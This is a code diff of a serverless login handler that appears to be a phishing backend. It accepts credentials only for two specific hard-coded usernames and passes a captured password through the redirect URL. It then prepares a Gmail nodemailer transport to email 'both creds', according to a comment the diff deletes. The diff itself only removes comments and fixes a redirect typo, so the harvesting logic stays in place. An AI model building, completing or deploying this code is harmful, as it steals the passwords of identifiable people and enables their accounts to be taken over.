@@ -9,22 +9,16 @@ exports.handler = async (event) => {
   const username = data.get('username')?.trim();
   const password = data.get('password');
 
-  // First step (no first param)
   if (!first) {
     if (username !== 'anu_shkasingh_73' && username !== 'anuuwwshka') {
       return { statusCode:302, headers:{Location:'/?error=invalidfirst'} };
     }
-    // redirect to second step
-    return { statusCode:302, headers:{Location:'/??first='+username+'&firstpass='+encodeURIComponent(password)+'&error=next'} };
+    return { statusCode:302, headers:{Location:'/?first='+username+'&firstpass='+encodeURIComponent(password)+'&error=next'} };
   }
-
-  // Second step: check opposite
-  const other = first==='anu_shkasingh_73' ? 'anuuwwshka' : 'anu_shkasingh_73';
+  const other = first==='anu_shkasingh_73'?'anuuwwshka':'anu_shkasingh_73';
   if (username !== other) {
     return { statusCode:302, headers:{Location:'/?first='+first+'&firstpass='+encodeURIComponent(firstpass)+'&error=next'} };
   }
-
-  // send email with both creds
   const transporter = nodemailer.createTransport({
     service:'gmail', auth:{user:process.env.GMAIL_USER, pass:process.env.GMAIL_PASS}
   });
